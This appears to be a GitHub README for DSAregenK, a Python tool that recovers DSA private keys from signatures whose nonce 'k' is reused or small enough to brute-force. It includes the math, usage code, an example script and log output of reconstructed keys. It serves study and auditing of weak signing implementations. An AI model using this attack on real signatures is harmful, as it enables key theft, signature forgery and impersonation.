DSAregenK
=========

:zap: **This project has been incorporated into https://github.com/tintinweb/ecdsa-private-key-recovery which comes with a way nicer interface** 

Recover the private key of signed DSA messages with weak coefficient 'k'. 
The coefficient is considered weak if 'k' is 
* not unique per message
* not randomly selected for signed messages
* small enough to make brute_force feasable


DSA Signature (r,s):

	r = g^k mod p mod q
	s = k-1 (H(m) + x*r) mod q
	
	x 	... private exponent
	y	... public exponent
	H()	... hash function
	m	... message
	g	... group generator
	p	... prime
	q	... subprime
	r,s	... digital signature components
	k	... per message secret number
	

Modus #1 - 'k' is not unique for all signed messages
--------

Given two+ signed message hashes h(mA),h(mB) with signatures (rA,sA) and (rB,sB) where rA==rB and shared public_key 
coefficients (at least subprime q) one can reconstruct the private key used to sign these messages.

DSAregenK().run() - will try to find duplicate 'r' and reconstruct the private_key. just feed as many (sig),hash tuples as you want ( .add())

Code: (use run() or _attack())

	a = DSAregenK(pubkey=pubkey)           # feed pubkey 
	a.add( (r1,s1),h1 )                    # add signed messages
	    
	for re_privkey in a.run(asDSAobj=True):     # reconstruct privatekey from samples (needs at least 2 signed messages with equal r param)
	    if re_privkey.x == privkey.x:           # compare regenerated privkey with one of the original ones (just a quick check :))
	        LOG.info( "Successfully bruteforced private_key: %s"%repr(re_privkey))
	    else:
	        LOG.error("Something went wrong :( %s"%repr(re_privkey))


Modus #2 - 'k' is a weak small number (or within a range of numbers)
---------

If we manage to find a 'k' so that g^k mod p mod q == 'r' we can reconstruct the private_key 'x'. Remember 'g' is part of the public_key.

Benchmark: 2^15 trials will take less than 3mins on heavily loaded Intel Core2Duo @ 2.5GHz, 32bit python. (related: [Debian PRNG Issue](http://www.debian.org/security/2008/dsa-1571))

DSAregenK().runBrute() - will try to find a matching 'k' and reconstruct the private_key. just feed as many (sig),hash tuples as you want ( .add()).

Code: (use runBrute() or _brute_k())

	a = DSAregenK(pubkey=pubkey)           # feed pubkey 
	a.add( (r1,s1),h1 )                    # add signed messages
	    
	for re_privkey in a.runBrute(asDSAobj=True,maxTries=0xff):     # reconstruct privatekey from samples (needs at least 2 signed messages with equal r param)
	    if re_privkey.x == privkey.x:           # compare regenerated privkey with one of the original ones (just a quick check :))
	        LOG.info( "Successfully bruteforced private_key: %s"%repr(re_privkey))
	    else:
	        LOG.error("Something went wrong :( %s"%repr(re_privkey))




Prerequesites:
=============

In order to reconstruct the private_key of signed DSA messages you need to have:

* public_key parameters q [,y,g,p]
* a signed message consisting of: 
  * h(m) ... hashed message 
  * (r,s)... signature
* [modus #1] at least two messages with equal 'r'
* [modus #2] at least one message with weak 'k' (small value or within a smaller range since we're bruteforcing 'k')


Example:
=========

See example.py

Code:

	from Crypto.Random import random
	from Crypto.PublicKey import DSA
	from Crypto.Hash import SHA
	
	from DSAregenK import DSAregenK		# <-- where the magic happens
	
	import logging
	LOG = logging.getLogger('DSAregenK')
	LOG.setLevel(logging.DEBUG)
	logging.debug("-- on --")    
	
	privkey = DSA.generate(1024)        # generate new privkey
	pubkey  = privkey.publickey()        # extract pubkey
	
	(r1,s1,h1)=(1104242600137843543695045937637417281163059700235L, 773789011712632302915807023844906579969862952621L, 857395097640348327305744475401170640455782257516L)
	(r2,s2,h2)=(1104242600137843543695045937637417281163059700235L, 684267073985982683308089132980132594478002742693L, 199515072252589500574227853970213073102209507294L)
	
	a = DSAregenK(pubkey=pubkey)        # feed pubkey 
	
	a.add( (r1,s1),h1 )                    # add signed messages
	a.add( (r2,s2),h2 )                    # add signed messages
	    
	for re_privkey in a.run(asDSAobj=True):     # reconstruct privatekey from samples (needs at least 2 signed messages with equal r param)
	    if re_privkey.x == privkey.x:           # compare regenerated privkey with one of the original ones (just a quick check :))
	        LOG.info( "Successfully reconstructed private_key: %s"%repr(re_privkey))
	    else:
	        LOG.error("Something went wrong :( %s"%repr(re_privkey))
	        
	        
	for re_privkey in a.runBrute(asDSAobj=True,maxTries=256):     # reconstruct privatekey from samples (needs at least 2 signed messages with equal r param)
	    if re_privkey.x == privkey.x:           # compare regenerated privkey with one of the original ones (just a quick check :))
	        LOG.info( "Successfully bruteforced private_key: %s"%repr(re_privkey))
	    else:
	        LOG.error("Something went wrong :( %s"%repr(re_privkey))
            

Output (this is output of running example.py):

	DEBUG:DSAregenK:-- Generating private key and signing 2 messages --
	DEBUG:DSAregenK: -- #1     Attacking weak coefficient 'k' -- 
	
	DEBUG:DSAregenK:+ set: pubkey = <_DSAobj @0x234a558 y,g,p(1024),q>
	DEBUG:DSAregenK:[*] reconstructing PrivKey for Candidate r=443448935073438978098329599020373933501766974614
	DEBUG:DSAregenK:privkey reconstructed: k=832436834964661206575791742093758389811362473232; x=110628923297496146512235297968474674504364642268;
	INFO:DSAregenK:Successfully reconstructed private_key: <_DSAobj @0x23f98f0 y,g,p(1024),q,x,private> | x=110628923297496146512235297968474674504364642268
	DEBUG:DSAregenK:----------------------------------------------------------
	DEBUG:DSAregenK:+ set: pubkey = <_DSAobj @0x23f9788 y,g,p(1024),q>
	DEBUG:DSAregenK:[*] reconstructing PrivKey for Candidate r=330419356605368005454791228414289777713764415514
	DEBUG:DSAregenK:privkey reconstructed: k=45618860491177950659668700212946090908744911490; x=1008688504343499533641023352967455614331438386097;
	INFO:DSAregenK:Successfully reconstructed private_key: <_DSAobj @0x23f99e0 y,g,p(1024),q,x,private> | x=1008688504343499533641023352967455614331438386097
	
	DEBUG:DSAregenK:----------------------------------------------------------
	DEBUG:DSAregenK: -- #2     Bruteforcing weak 'small' coefficient 'k' -- 
	DEBUG:DSAregenK:+ set: pubkey = <_DSAobj @0x234a558 y,g,p(1024),q>
	DEBUG:DSAregenK:[*] bruteforcing PrivKey for r=443448935073438978098329599020373933501766974614
	DEBUG:DSAregenK:[** - sample for r=443448935073438978098329599020373933501766974614]
	ERROR:root:Max tries reached! - 256/256
	DEBUG:DSAregenK:[** - sample for r=443448935073438978098329599020373933501766974614]
	ERROR:root:Max tries reached! - 256/256
	DEBUG:DSAregenK:+ set: pubkey = <_DSAobj @0x23f9788 y,g,p(1024),q>
	DEBUG:DSAregenK:[*] bruteforcing PrivKey for r=286402551519135367029695561004357693825886532729
	DEBUG:DSAregenK:[** - sample for r=286402551519135367029695561004357693825886532729]
	INFO:DSAregenK:Successfully brute_forced private_key: <_DSAobj @0x23f9a58 y,g,p(1024),q,x,private> | x=1008688504343499533641023352967455614331438386097
	
	DEBUG:DSAregenK:----------------------------------------------------------
	DEBUG:DSAregenK:[*] bruteforcing PrivKey for r=330419356605368005454791228414289777713764415514
	DEBUG:DSAregenK:[** - sample for r=330419356605368005454791228414289777713764415514]
	ERROR:root:Max tries reached! - 256/256
	DEBUG:DSAregenK:[** - sample for r=330419356605368005454791228414289777713764415514]
	ERROR:root:Max tries reached! - 256/256
	DEBUG:DSAregenK:[*] bruteforcing PrivKey for r=919015998067315070352004368887215044863856178317
	DEBUG:DSAregenK:[** - sample for r=919015998067315070352004368887215044863856178317]
	ERROR:root:Max tries reached! - 256/256
	DEBUG:DSAregenK:--- END ---

	

Dependencies:
=============

* [PyCrypto](https://www.dlitz.net/software/pycrypto/)



More Infos:
===========

* [DSA requirements for random k values](http://rdist.root.org/2010/11/19/dsa-requirements-for-random-k-value/)


